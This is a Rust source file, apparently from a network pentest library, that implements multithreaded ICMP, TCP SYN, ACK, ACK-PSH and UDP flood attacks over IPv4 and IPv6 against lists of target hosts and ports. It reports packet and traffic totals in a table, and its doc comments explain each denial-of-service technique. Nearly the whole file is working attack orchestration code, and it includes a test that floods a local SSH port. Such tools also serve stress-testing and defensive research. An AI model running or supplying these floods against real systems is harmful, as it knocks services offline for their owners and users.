#[cfg(feature = "flood")]
use chrono::DateTime;
#[cfg(feature = "flood")]
use chrono::Local;
#[cfg(feature = "flood")]
use prettytable::Cell;
#[cfg(feature = "flood")]
use prettytable::Row;
#[cfg(feature = "flood")]
use prettytable::Table;
#[cfg(feature = "flood")]
use prettytable::row;
#[cfg(feature = "flood")]
use std::collections::HashMap;
#[cfg(feature = "flood")]
use std::fmt;
#[cfg(feature = "flood")]
use std::net::IpAddr;
#[cfg(feature = "flood")]
use std::net::Ipv4Addr;
#[cfg(feature = "flood")]
use std::net::Ipv6Addr;
#[cfg(feature = "flood")]
use std::panic::Location;
#[cfg(feature = "flood")]
use std::sync::mpsc::channel;

#[cfg(feature = "flood")]
pub mod icmp;
#[cfg(feature = "flood")]
pub mod icmpv6;
#[cfg(feature = "flood")]
pub mod tcp;
#[cfg(feature = "flood")]
pub mod tcp6;
#[cfg(feature = "flood")]
pub mod udp;
#[cfg(feature = "flood")]
pub mod udp6;

#[cfg(feature = "flood")]
use crate::Target;
#[cfg(feature = "flood")]
use crate::error::PistolError;
#[cfg(feature = "flood")]
use crate::utils::find_source_addr;
#[cfg(feature = "flood")]
use crate::utils::find_source_addr6;
#[cfg(feature = "flood")]
use crate::utils::get_threads_pool;
#[cfg(feature = "flood")]
use crate::utils::random_port;

#[cfg(feature = "flood")]
#[derive(Debug, Clone)]
pub struct PortFloods {
    pub send_packets: usize, // count
    pub send_traffic: f64,   // KB, MB or GB
    pub stime: DateTime<Local>,
    pub etime: DateTime<Local>,
}

#[cfg(feature = "flood")]
impl PortFloods {
    pub fn new() -> PortFloods {
        PortFloods {
            send_packets: 0,
            send_traffic: 0.0,
            stime: Local::now(),
            etime: Local::now(),
        }
    }
}

#[cfg(feature = "flood")]
#[derive(Debug, Clone)]
pub struct FloodAttacks {
    pub summary: HashMap<IpAddr, HashMap<u16, PortFloods>>,
    pub total_send_packets: usize,
    pub total_send_traffic: f64,
    pub stime: DateTime<Local>,
    pub etime: DateTime<Local>,
}

#[cfg(feature = "flood")]
impl FloodAttacks {
    pub fn new() -> FloodAttacks {
        FloodAttacks {
            summary: HashMap::new(),
            total_send_packets: 0,
            total_send_traffic: 0.0,
            stime: Local::now(),
            etime: Local::now(),
        }
    }
    pub fn enrichment(&mut self) {
        self.etime = Local::now(); // assign etime here
        let mut total_send_packets = 0;
        let mut total_send_traffic = 0.0;
        for (_ip, hm) in &self.summary {
            for (_port, detail) in hm {
                total_send_packets += detail.send_packets;
                total_send_traffic += detail.send_traffic;
            }
        }
        self.total_send_packets = total_send_packets;
        self.total_send_traffic = total_send_traffic;
    }
}

#[cfg(feature = "flood")]
impl fmt::Display for FloodAttacks {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        const BYTES_PER_GB: u64 = 1024 * 1024;
        const BYTES_PER_MB: u64 = 1024;
        let mut table = Table::new();
        table.add_row(Row::new(vec![
            Cell::new("Flood Attack Summary")
                .style_spec("c")
                .with_hspan(3),
        ]));
        table.add_row(row!["Addr", "Port", "Details"]);
        for (ip, hm) in &self.summary {
            for (port, detail) in hm {
                let traffc_str = if detail.send_traffic / BYTES_PER_GB as f64 > 1.0 {
                    format!("{:.1} GB", detail.send_traffic / BYTES_PER_GB as f64)
                } else if detail.send_traffic / BYTES_PER_MB as f64 > 1.0 {
                    format!("{:.1} MB", detail.send_traffic / BYTES_PER_MB as f64)
                } else {
                    format!("{:.1} Bytes", detail.send_traffic)
                };
                let time_cost = detail
                    .etime
                    .signed_duration_since(detail.stime)
                    .num_milliseconds();
                let detail_str = format!(
                    "packets: {}\ntraffic: {}\ntime: {:.3}s",
                    detail.send_packets, traffc_str, time_cost,
                );
                table.add_row(row![ip, port, detail_str]);
            }
        }
        write!(f, "{}", table.to_string())
    }
}

#[cfg(feature = "flood")]
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum FloodMethods {
    Icmp,
    Syn,
    Ack,
    AckPsh,
    Udp,
}

#[cfg(feature = "flood")]
fn ipv4_flood(
    method: FloodMethods,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: u16,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<(usize, usize), PistolError> {
    let src_ipv4 = match find_source_addr(src_addr, dst_ipv4)? {
        Some(s) => s,
        None => return Err(PistolError::CanNotFoundSourceAddress),
    };
    let dst_port = if method == FloodMethods::Icmp {
        0
    } else {
        dst_port
    };

    let func = match method {
        FloodMethods::Icmp => icmp::send_icmp_flood_packet,
        FloodMethods::Syn => tcp::send_syn_flood_packet,
        FloodMethods::Ack => tcp::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp::send_udp_flood_packet,
    };
    let mut total_send_buff_size = 0;
    let mut count = 0;
    let (tx, rx) = channel();
    let pool = get_threads_pool(threads_num);
    let mut recv_size = 0;

    for _ in 0..max_flood_packet {
        recv_size += 1;
        let tx = tx.clone();
        pool.execute(move || {
            let send_buff_size = match func(dst_ipv4, dst_port, src_ipv4, src_port, max_same_packet)
            {
                Ok(s) => s + 14, // Ethernet frame header length.
                Err(_) => 0,
            };
            tx.send(send_buff_size)
                .expect(&format!("tx send failed at {}", Location::caller()));
        });
    }
    let iter = rx.into_iter().take(recv_size);
    for send_buff_size in iter {
        total_send_buff_size += send_buff_size;
        count += 1;
    }
    Ok((count * max_flood_packet, total_send_buff_size))
}

#[cfg(feature = "flood")]
fn ipv6_flood(
    method: FloodMethods,
    dst_ipv6: Ipv6Addr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: u16,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<(usize, usize), PistolError> {
    let src_ipv6 = match find_source_addr6(src_addr, dst_ipv6)? {
        Some(s) => s,
        None => return Err(PistolError::CanNotFoundSourceAddress),
    };

    let dst_port = if method == FloodMethods::Icmp {
        0
    } else {
        dst_port
    };

    let func = match method {
        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet,
        FloodMethods::Syn => tcp6::send_syn_flood_packet,
        FloodMethods::Ack => tcp6::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp6::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp6::send_udp_flood_packet,
    };
    let mut total_send_buff_size = 0;
    let mut count = 0;
    let (tx, rx) = channel();
    let pool = get_threads_pool(threads_num);
    let mut recv_size = 0;

    for _ in 0..max_flood_packet {
        recv_size += 1;
        let tx = tx.clone();
        pool.execute(move || {
            let send_buff_size = match func(dst_ipv6, dst_port, src_ipv6, src_port, max_same_packet)
            {
                Ok(s) => s + 14, // Ethernet frame header length.
                Err(_) => 0,
            };
            tx.send(send_buff_size)
                .expect(&format!("tx send failed at {}", Location::caller()));
        });
    }
    let iter = rx.into_iter().take(recv_size);
    for send_buff_size in iter {
        total_send_buff_size += send_buff_size;
        count += 1;
    }
    Ok((count * max_flood_packet, total_send_buff_size))
}

#[cfg(feature = "flood")]
fn flood(
    targets: &[Target],
    method: FloodMethods,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttacks, PistolError> {
    let mut flood_attack_summary = FloodAttacks::new();
    let (tx, rx) = channel();
    let pool = get_threads_pool(threads_num);
    let mut recv_size = 0;

    let src_port = match src_port {
        Some(p) => p,
        None => random_port(),
    };

    for host in targets {
        let dst_addr = host.addr;
        match dst_addr {
            IpAddr::V4(dst_ipv4) => {
                for &dst_port in &host.ports {
                    let dst_port = dst_port.clone();
                    let tx = tx.clone();
                    recv_size += 1;
                    pool.execute(move || {
                        let stime = Local::now();
                        let ret = ipv4_flood(
                            method,
                            dst_ipv4,
                            dst_port,
                            src_addr,
                            src_port,
                            threads_num,
                            max_same_packet,
                            max_flood_packet,
                        );
                        tx.send((dst_addr, 0, ret, stime))
                            .expect(&format!("tx send failed at {}", Location::caller()));
                    });
                }
            }
            IpAddr::V6(dst_ipv6) => {
                for &dst_port in &host.ports {
                    let dst_port = dst_port.clone();
                    let tx = tx.clone();
                    recv_size += 1;
                    pool.execute(move || {
                        let stime = Local::now();
                        let ret = ipv6_flood(
                            method,
                            dst_ipv6,
                            dst_port,
                            src_addr,
                            src_port,
                            threads_num,
                            max_same_packet,
                            max_flood_packet,
                        );
                        tx.send((dst_addr, 0, ret, stime))
                            .expect(&format!("tx send failed at {}", Location::caller()));
                    });
                }
            }
        }
    }

    let iter = rx.into_iter().take(recv_size);
    for (ip, port, ret, stime) in iter {
        let mut detail = PortFloods::new();
        let etime = Local::now();
        match ret {
            Ok((packets, traffic)) => {
                // println!(">>> {}", traffic);
                detail.send_packets = packets;
                detail.send_traffic = traffic as f64;
                detail.stime = stime;
                detail.etime = etime;
            }
            Err(e) => return Err(e),
        }

        match flood_attack_summary.summary.get_mut(&ip.into()) {
            Some(hm) => {
                hm.insert(port, detail);
            }
            None => {
                let mut hm = HashMap::new();
                hm.insert(port, detail);
                flood_attack_summary.summary.insert(ip.into(), hm);
            }
        }
    }
    flood_attack_summary.enrichment();
    Ok(flood_attack_summary)
}

/// An Internet Control Message Protocol (ICMP) flood DDoS attack, also known as a Ping flood attack,
/// is a common Denial-of-Service (DoS) attack in which an attacker attempts to overwhelm a targeted device with ICMP echo-requests (pings).
/// Normally, ICMP echo-request and echo-reply messages are used to ping a network device in order to diagnose the health and connectivity of the device and the connection between the sender and the device.
/// By flooding the target with request packets, the network is forced to respond with an equal number of reply packets.
/// This causes the target to become inaccessible to normal traffic.
#[cfg(feature = "flood")]
pub fn icmp_flood(
    targets: &[Target],
    src_addr: Option<IpAddr>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttacks, PistolError> {
    flood(
        targets,
        FloodMethods::Icmp,
        src_addr,
        Some(0),
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

#[cfg(feature = "flood")]
pub fn icmp_flood_raw(
    dst_addr: IpAddr,
    src_addr: Option<IpAddr>,
    max_same_packet: usize,
) -> Result<usize, PistolError> {
    let dst_port = 0;
    let src_port = None;
    flood_raw(
        FloodMethods::Icmp,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

/// In a TCP SYN Flood attack, the malicious entity sends a barrage of SYN requests to a target server but intentionally avoids sending the final ACK.
/// This leaves the server waiting for a response that never comes, consuming resources for each of these half-open connections.
#[cfg(feature = "flood")]
pub fn tcp_syn_flood(
    targets: &[Target],
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttacks, PistolError> {
    flood(
        targets,
        FloodMethods::Syn,
        src_addr,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

#[cfg(feature = "flood")]
pub fn tcp_syn_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolError> {
    flood_raw(
        FloodMethods::Syn,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

/// TCP ACK flood, or 'ACK Flood' for short, is a network DDoS attack comprising TCP ACK packets.
/// The packets will not contain a payload but may have the PSH flag enabled.
/// In the normal TCP, the ACK packets indicate to the other party that the data have been received successfully.
/// ACK packets are very common and can constitute 50% of the entire TCP packets.
/// The attack will typically affect stateful devices that must process each packet and that can be overwhelmed.
/// ACK flood is tricky to mitigate for several reasons. It can be spoofed;
/// the attacker can easily generate a high rate of attacking traffic,
/// and it is very difficult to distinguish between a Legitimate ACK and an attacking ACK, as they look the same.
#[cfg(feature = "flood")]
pub fn tcp_ack_flood(
    targets: &[Target],
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttacks, PistolError> {
    flood(
        targets,
        FloodMethods::Ack,
        src_addr,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

#[cfg(feature = "flood")]
pub fn tcp_ack_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolError> {
    flood_raw(
        FloodMethods::Ack,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

/// TCP ACK flood with PSH flag set.
#[cfg(feature = "flood")]
pub fn tcp_ack_psh_flood(
    targets: &[Target],
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttacks, PistolError> {
    flood(
        targets,
        FloodMethods::AckPsh,
        src_addr,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

#[cfg(feature = "flood")]
pub fn tcp_ack_psh_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolError> {
    flood_raw(
        FloodMethods::AckPsh,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

/// In a UDP Flood attack, the attacker sends a massive number of UDP packets to random ports on the target host.
/// This barrage of packets forces the host to:
/// Check for applications listening at each port.
/// Realize that no application is listening at many of these ports.
/// Respond with an Internet Control Message Protocol (ICMP) Destination Unreachable packet.
#[cfg(feature = "flood")]
pub fn udp_flood(
    targets: &[Target],
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<FloodAttacks, PistolError> {
    flood(
        targets,
        FloodMethods::Udp,
        src_addr,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

#[cfg(feature = "flood")]
pub fn udp_flood_raw(
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolError> {
    flood_raw(
        FloodMethods::Udp,
        dst_addr,
        dst_port,
        src_addr,
        src_port,
        max_same_packet,
    )
}

#[cfg(feature = "flood")]
pub fn flood_raw(
    method: FloodMethods,
    dst_addr: IpAddr,
    dst_port: u16,
    src_addr: Option<IpAddr>,
    src_port: Option<u16>,
    max_same_packet: usize,
) -> Result<usize, PistolError> {
    let func = match method {
        FloodMethods::Icmp => icmp::send_icmp_flood_packet,
        FloodMethods::Syn => tcp::send_syn_flood_packet,
        FloodMethods::Ack => tcp::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp::send_udp_flood_packet,
    };
    let func6 = match method {
        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet,
        FloodMethods::Syn => tcp6::send_syn_flood_packet,
        FloodMethods::Ack => tcp6::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp6::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp6::send_udp_flood_packet,
    };
    let src_port = match src_port {
        Some(p) => p,
        None => random_port(),
    };
    match dst_addr {
        IpAddr::V4(dst_ipv4) => {
            match find_source_addr(src_addr, dst_ipv4)? {
                Some(src_ipv4) => {
                    let send_buff_size =
                        match func(dst_ipv4, dst_port, src_ipv4, src_port, max_same_packet) {
                            Ok(s) => s + 14, // Ethernet frame header length.
                            Err(_) => 0,
                        };
                    Ok(send_buff_size)
                }
                None => Err(PistolError::CanNotFoundSourceAddress),
            }
        }
        IpAddr::V6(dst_ipv6) => {
            match find_source_addr6(src_addr, dst_ipv6)? {
                Some(src_ipv6) => {
                    let send_buff_size =
                        match func6(dst_ipv6, dst_port, src_ipv6, src_port, max_same_packet) {
                            Ok(s) => s + 14, // Ethernet frame header length.
                            Err(_) => 0,
                        };
                    Ok(send_buff_size)
                }
                None => Err(PistolError::CanNotFoundSourceAddress),
            }
        }
    }
}

#[cfg(feature = "flood")]
#[cfg(test)]
mod tests {
    use super::*;
    use crate::TEST_IPV4_LOCAL;
    use crate::Target;
    #[test]
    fn test_flood() {
        let src_ipv4 = None;
        let src_port: Option<u16> = None;
        let threads_num: usize = 128;
        let target = Target::new(TEST_IPV4_LOCAL.into(), Some(vec![22]));
        let ret = tcp_syn_flood(&[target], src_ipv4, src_port, threads_num, 3, 3).unwrap();
        println!("{}", ret);
    }
}
